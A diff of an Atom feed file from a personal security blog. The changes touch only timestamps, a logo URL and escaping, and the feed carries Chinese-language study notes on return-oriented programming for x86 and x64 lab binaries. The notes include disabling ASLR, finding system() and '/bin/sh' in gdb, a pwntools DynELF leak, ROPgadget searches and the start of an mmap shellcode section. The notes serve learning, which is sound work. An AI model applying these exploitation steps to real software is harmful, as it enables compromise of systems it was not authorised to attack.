@@ -1,6 +1,7 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN"><id>/</id><title>yurisec</title><updated>2020-05-19T13:21:06.493685+08:06</updated><author><name>Yuri</name><email>yuripwn@gmail.com</email></author><link href="/" rel="alternate"/><generator uri="https://lkiesow.github.io/python-feedgen" version="0.9.0">python-feedgen</generator><logo>/logo.png</logo><subtitle>A simple static blog.</subtitle><entry><id>/archives/ropNote/</id><title>一步一步学ROP笔记</title><updated>2020-05-19T13:21:06.493748+00:00</updated><author><name>yuri</name><email>yuripwn@gmail.com</email><uri>https://www.yurisec.cn</uri></author><content>&lt;h1&gt;一步一步学ROP笔记&lt;/h1&gt;
-&lt;blockquote&gt;&lt;p&gt;原文地址: &lt;a href="drops.wooyun.org/tips/6597"&gt;一步一步学ROP&lt;/a&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN"><id>/</id><title>yurisec</title><updated>2020-05-19T13:31:38.271925+08:06</updated><author><name>Yuri</name><email>yuripwn@gmail.com</email></author><link href="/" rel="alternate"/><generator uri="https://lkiesow.github.io/python-feedgen" version="0.9.0">python-feedgen</generator><logo>https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/logo.png</logo><subtitle>A simple static blog.</subtitle><entry><id>/archives/ropNote/</id><title>一步一步学ROP笔记</title><updated>2020-05-19T13:31:38.272006+00:00</updated><author><name>yuri</name><email>yuripwn@gmail.com</email><uri>https://www.yurisec.cn</uri></author><content>&lt;h1&gt;一步一步学ROP笔记&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;原文地址: &lt;a href="drops.wooyun.org/tips/6597"&gt;一步一步学ROP&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2&gt;x86&lt;/h2&gt;
 &lt;h3&gt;无保护&lt;/h3&gt;
@@ -10,7 +11,7 @@
 &lt;li&gt;关掉PIE:  &lt;strong&gt;sudo -s echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3&gt;绕过NX&lt;/h3&gt;
-&lt;p&gt;gdb下找&lt;code&gt;system()&lt;/code&gt;和&lt;code&gt;"/bin/sh\x00"&lt;/code&gt;的地址:&lt;/p&gt;
+&lt;p&gt;gdb下找&lt;code&gt;system()&lt;/code&gt;和&lt;code&gt;&amp;quot;/bin/sh\x00&amp;quot;&lt;/code&gt;的地址:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; print system
 &lt;span class="nv"&gt;$1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0xb7e5f460 &amp;lt;system&amp;gt;
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; print __libc_start_main
@@ -54,7 +55,7 @@
 &lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DynELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./level2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;span class="n"&gt;system_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lookup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;libc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;x64&lt;/h2&gt;
 &lt;h3&gt;传参区别&lt;/h3&gt;
 &lt;ul&gt;
@@ -62,8 +63,8 @@
 &lt;/ul&gt;
 &lt;h3&gt;gadgets&lt;/h3&gt;
 &lt;ul&gt;
-&lt;li&gt;找ROP:  &lt;strong&gt;ROPgadget --binary level4 --only "pop|ret"&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;过滤:  &lt;strong&gt;ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;找ROP:  &lt;strong&gt;ROPgadget --binary level4 --only &amp;quot;pop|ret&amp;quot;&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;过滤:  &lt;strong&gt;ROPgadget --binary libc.so.6 --only &amp;quot;pop|ret&amp;quot; | grep rdi&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3&gt;通用gadgets part1&lt;/h3&gt;
 &lt;p&gt;&lt;code&gt;__libc_csu_init()&lt;/code&gt;下:&lt;/p&gt;
@@ -180,7 +181,7 @@
 &lt;/pre&gt;&lt;/div&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;利用mmap执行任意shellcode&lt;/h2&gt;
 &lt;p&gt;mmap或者mprotect将某块内存改成RWX, 然后将shellcode保存到这块内存, 然后控制pc跳转过去就可以执行任意的shellcode了.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)&lt;/span&gt;
